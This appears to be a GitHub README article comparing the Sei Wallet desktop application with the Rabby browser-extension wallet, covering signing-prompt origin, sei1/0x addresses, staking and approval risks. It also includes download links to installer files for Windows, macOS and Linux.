![Sei Wallet](https://github.com/sei-chain/sei-wallet-help/raw/main/assets/banner-article.png)

<h1 align="center">Sei Wallet and Rabby: desktop wallet or EVM extension</h1>

<p align="center">An EVM-first extension beside a Sei-first desktop wallet.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Rabby is a general EVM wallet delivered as a browser extension: multi-chain by default, with pre-signing checks that try to show you what a transaction will do before you approve it. Sei Wallet is a single-chain desktop application with staking built in.

Both can hold SEI. They differ in where the signing prompt comes from, how many chains they cover, and what they do about the part of an approval that is not obvious - which is where most losses happen.

## The comparison that matters

<div align="center">

| | Sei Wallet | Rabby |
|---|---|---|
| Form | Desktop application | Browser extension |
| Chains | Sei only | Many EVM chains |
| Signing prompt origin | Inside the app | Injected into web pages |
| Address format | `0x...` native, `sei1...` read-only | `0x...` |
| Staking | Built in | Not a wallet function |
| Pre-signing simulation | Not something I verified | Its stated focus, not verified here |
| Hardware wallet | Supported | Supported |

</div>

Two rows deserve a caveat rather than a claim. I did not verify this app's pre-signing behaviour, and I did not verify the current Rabby build's simulation coverage either. What I can say is that simulation is Rabby's advertised differentiator, and that no simulation is a substitute for knowing what you are approving.

## Where the signing prompt comes from

This is the structural difference, and it drives the rest.

A browser extension exposes a provider to every page. That is why Rabby works smoothly with web applications and why any site you visit can raise a prompt. The extension's job is to make that prompt informative - simulation, warnings, chain context - but the prompt originates from the page.

A desktop app has no page-level hook. You bring the transaction to it, so a malicious page cannot ask for a signature directly. What it loses is the seamlessness, and what it gains is that the default state is "nothing is asking".

Neither is safer in the abstract. The extension's risk is a prompt you approve without reading; the desktop app's risk is a download from the wrong place. Pick the failure mode you are better at avoiding.

## Address handling

Both produce `0x...` addresses from the Ethereum derivation, so the same phrase gives the same account in each. The difference is what each interface tells you about the other form.

Sei has a dual address system: one key, a `0x...` and a `sei1...` address, linked on-chain by an association. This app displays the `sei1...` form read-only, which makes the relationship visible. A general EVM wallet shows only the `0x...` form, so a balance sitting under the Cosmos-side representation simply does not appear - and that absence looks like a loss.

[Address handling](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) is the article that resolves those cases, and it applies to Rabby as much as to any other EVM wallet.

## Staking

Delegation is a chain-level action, so any wallet can in principle expose it, but a general EVM wallet generally does not. Rabby is a signing and portfolio interface, not a staking one.

If staking is your main activity on Sei, [staking support](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md) is the difference that matters, and it is the strongest argument for an app built around this chain.

## Approvals, where both are exposed

The approval-drain pattern is identical in both wallets: a site asks you to approve spending, you approve, and the approval outlives the site. Rabby's simulation can flag some of these; this desktop app relies on you reading the prompt; a hardware wallet relies on you reading the device.

None of that removes the risk. The durable defences are behavioural: revoke approvals you no longer need, never approve an amount larger than the operation requires, and be suspicious of "claim" flows that need an approval to give you something.

## What is and is not verified

Sei Wallet describes its builds as audited and signed, and the report is published in the audit repository the team maintains; [the Sei Wallet safety guide](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md) sets out what that claim covers. It applies to the desktop app regardless of which wallet you compare it to.

I did not assess Rabby's security claims, its audits, or its company records in this project. "Widely used" is not "verified", and this article does not treat either product's popularity as evidence.

## Which to choose

**Rabby** if your activity spans several EVM chains, you live in a browser, and you want one interface with transaction previews. It is a strong general-purpose choice, and Sei is one entry in its network list.

**Sei Wallet** if you hold SEI, stake it, and want both addresses of one account made explicit instead of left to discovery. Single-chain scope is a limitation and also a simplification.

**Both**, with separate phrases if you can - one for the balance you keep, one for the float you spend in web applications. Same phrase in both doubles the places it can leak from.

If you are choosing between general EVM wallets rather than between shapes, [the MetaMask baseline](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) is the more common starting point, and Rabby is the same category with a different emphasis.

## If you came from a Cosmos-first wallet

Neither of these produces Cosmos-style addresses, which is the point. If your SEI currently sits under a `sei1...` address, the migration is a transfer rather than an import, and [the Keplr comparison](https://github.com/sei-chain/sei-wallet-help/blob/main/keplr-compared-with-a-desktop-app.md) explains what that wallet was doing differently.

## Frequently asked questions

**Does Rabby support Sei?** It is a general EVM wallet, so Sei can be added as a network like any other EVM chain. Check its current version for the exact flow.

**Is Rabby safer than Sei Wallet?** Different rather than safer. An extension exposes a provider to every page; a desktop app exposes an installer. Neither property makes a wallet safe on its own.

**Will my address be the same in both?** The `0x...` address should be, since both use the Ethereum derivation. The `sei1...` form is Sei-specific and only this app shows it.

**Can I stake in Rabby?** General EVM wallets do not provide Sei staking. Delegation needs an interface built for it.

**Do both work with a Ledger?** Yes, with the same caveat: the derivation must match the account holding your balance.

**Which one should a beginner use?** Whichever matches what they will actually do. Staking a single asset: the desktop app. Moving between chains: an extension.

**What is the desktop option?** [An overview of the product](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) has the fuller picture if you want it before deciding.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [How to stake SEI in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md)
- [Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md)
- [Add Sei to MetaMask, or use a Sei wallet instead](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md)
